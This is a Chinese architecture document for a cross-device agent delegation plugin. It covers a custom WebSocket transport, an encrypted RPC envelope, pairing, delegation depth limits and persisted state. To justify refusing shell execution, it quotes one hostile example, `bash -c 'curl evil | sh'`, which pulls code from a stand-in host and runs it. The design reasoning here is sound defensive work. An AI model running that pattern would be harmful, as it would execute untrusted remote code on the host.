# 架构与实现

## 目录

```
src/
├── index.ts                  插件入口：apply(ctx, config) + 生命周期
├── config.ts                 配置归一化（信任边界：不信任 Loader 行）
├── security.ts               身份、配对、会话密钥、信封 MAC
├── transport/
│   ├── websocket.ts          零依赖 RFC 6455（文本帧、分片、ping/pong、close）
│   ├── server.ts             监听端（net/tls）+ 拨号端（手写 Upgrade）
│   └── link.ts               一条对端的完整生命周期：拨号、握手、心跳、重连、状态
├── rpc/
│   ├── handshake.ts          hello 交换与验证（双向对称）
│   ├── wire.ts               加密信封：AES-GCM 密文 + HMAC(from,to,seq,ts,body)
│   └── peer.ts               请求/响应/事件流/取消（两侧同一实现）
├── peer/
│   ├── manager.ts            拥有监听、所有 link、配对存储、状态快照
│   ├── handlers.ts           RPC 方法表（每个 handler 自己再查权限）
│   └── capabilities.ts       文件/命令/日志/传输的本地执行与策略
├── delegation/
│   ├── provider.ts           本端：external SubagentProvider（只实现 start）
│   └── runner.ts             对端：用 ctx.agents.create 起真子 Agent
├── sessions/
│   └── tasks.ts              任务账本（append-only JSONL）+ 幂等守卫
└── tools/
    ├── types.ts              对外部 API 的最小类型镜像
    └── mesh-tools.ts         17 个模型可见工具
lib/                          构建产物（由 src/ 生成，随包分发）
tests/                        4 个测试文件，按证据类型划分
docs/guides/                  安装、隧道、安全、工具、会话、限制
docs/acceptance.md            逐条验收与证据分级
docs/research/                上游 API 与工程链的取证记录
scripts/                      构建、导入检查、测试运行器、排错探针
```

## 关键取舍与理由

### 为什么自己实现 WebSocket

profile 的 `node_modules` 只包含该 profile 声明过的包。插件若 `import 'ws'`，在没装 `ws` 的机器上会加载失败；而把它作为依赖分发，又会让 profile 的依赖树被插件污染。RFC 6455 的服务端 + 客户端加起来不到 400 行，用 Node 内置 `net`/`tls`/`crypto` 完全够。

代价：不支持 permessage-deflate、二进制帧、扩展。对本插件（一帧一个 JSON）都不是问题。

### 为什么不用 ACP / SDK-over-stdio

两者都要求"本地 spawn 一个子进程"。跨设备时那个进程在另一台机器上，`spawn` 根本不成立——ACP 包和 SDK 包的 README 都明确写了"仅支持本地工作区 / 需要独立后端"。用它们反而要先把 stdio 隧道化，多一层且更脆。

因此选择了 **external SubagentProvider over 自建 WS**：DSH 的子代理 seam 允许"后端在别处"，`SubagentProvider.start()` 只要求返回 `{id, result, dispose}`，这正是跨设备需要的形状。

### 为什么控制信息藏在 prompt 里而不是 `cwd`

`SubagentStartRequest` 只有 `prompt` / `label` / `cwd` / `signal`。`cwd` 会被 DSH 的子代理管理器**在本机解析**：如果手机传 `/storage/…` 给 PC，PC 会把它当相对路径处理或直接失败。目标设备、远端工作目录、深度预算、幂等键必须由本插件自己的协议承载，所以编进 prompt 首行的一段控制头，只有 `MeshSubagentProvider` 解析。

### 为什么 external provider 不实现 `prepareContinuable`

实现了它，DSH 会把该 provider 当作**本地可续聊后端**，`startActivation` 走 `startLocal` 分支——远端就彻底不参与了。所以只实现 `start`（+ 四项 capability 全 false）。这也是为什么驱动它的工具必须 `maxDepth: 'provider-managed'`：`tool-subagent` 在 `depthLimit: false` 时会 throw，那是既有行为，不是本插件的选择。

### 为什么 `result` 永不 reject

DSH 的 external 运行在 `finishDisposal(stop=true)` 路径里会 `await run.result`。一个 rejected promise 会挂住父 Agent 的 teardown（实测证据见 `docs/research/subagent-external-facts.md` §4）。因此所有失败路径都 resolve 成 `stopReason: "error"` + diagnostic。

### 为什么应用层还要加密（隧道不是已经……）

樱花 FRP 的 TCP 隧道**不终结 TLS**，它是裸字节转发。要么在 PC 终止 TLS（需要证书），要么在应用层加密。两者独立实现：TLS 可选，应用层加密永远在。结果是即便 `ws://` 明文跑在公网上，隧道也只能看到密文和一次不含密钥的 hello。

### 为什么 `seq` 是每链路而不是全局

重连就是一次新链路。若 `seq` 全局单调，重连后要么继续高位（泄漏历史连接次数这种无关信息），要么要持久化计数器（多一份可能损坏的状态）。每链路从 1 开始，配合 `ts` 时间窗，重放防护仍然成立，且实现更简单。

### 为什么 `mesh_exec` 不允许 shell

有 shell 就等于把所有参数级检查作废：一条 `bash -c 'curl evil | sh'` 绕过 deny 列表、白名单、工作目录限制。所以命令被切成 program + args 且 `shell: false`，解释器与 shell 一律拒绝。

代价是复合命令做不到。这是刻意的取舍，规范里"高风险命令仍须遵守目标设备的审批机制"也指向同一方向。

### 为什么委托深度默认 1

规范要求"禁止子代理继续跨设备委托"。默认 1 在协议层就实现：被委托任务的 `remainingDepth = maxDelegationDepth - depth - 1 = 0`，远端据此在创建子 Agent 时 `tools.restrict({ deny: [...] })`，把委托工具从那个子 Agent 的工具面里摘掉。模型看不到工具，不会尝试调用。

## 数据流（一次委托）

```
本端 Agent
  └── mesh_delegate 工具
        └── ctx.subagents.startActivation({ provider: "mesh", delivery: "caller" })
              └── MeshSubagentProvider.start()
                    ├── 校验 device / depth
                    ├── 账本建 outbound 任务（direction=out）
                    └── rpc.request("mesh.delegate", { task, cwd, remainingDepth, requestKey, stream })
                          ↓ 加密信封 over WS ↓
                          对端 handlers["mesh.delegate"]
                            ├── 权限：allowDelegate？
                            └── RemoteTaskRunner.submit()
                                  ├── 幂等键命中？→ 返回原 taskId
                                  ├── 账本建 inbound 任务（direction=in）
                                  └── 后台启动：
                                        ctx.agents.create({ meta.origin="subagent", delegationDepth=1 })
                                          └── setup：remainingDepth==0 时 restrict 掉委托工具
                                        agent.followup(task)
                                        agent.ctx.on("session/event", …) → emit tool/progress
                                        agent.whenIdle()
                                          └── collectFinalText + collectArtifacts
                                              └── 账本 completed + result
                          ↑ 轮询 mesh.task.result ↑
                    └── 映射成 SubagentResult{ output, stopReason }
```

取消时：本端 `signal` 中断 → provider 向对端发 `mesh.task.cancel` → 对端 `agent.cancel({kind:'parent'})` → 子 Agent 在步边界停 → `run.result` 以 `aborted` resolve。

## 状态与持久化

| 位置 | 内容 | 生命周期 |
|---|---|---|
| `$DSH_HOME/dsh-mesh/identity.json` | Ed25519 密钥对、device id | 永久，除非手动删除 |
| `$DSH_HOME/dsh-mesh/pairings.json` | 每个对端的配对码与密钥 | 直到 `mesh_pair remove` |
| `$DSH_HOME/dsh-mesh/tasks.jsonl` | 任务账本（append-only） | 永久增长，读时折叠 |
| `$DSH_HOME/dsh-mesh/audit.jsonl` | 对端动作审计 | 永久增长，内存中保留最近 N 条 |
| `$DSH_HOME/dsh-mesh/transfers/*.part` | 传输中的暂存片 | commit 或失败后清理 |

内存侧只保留：活跃 link、in-flight RPC、账本折叠后的记录、审计环形缓冲。
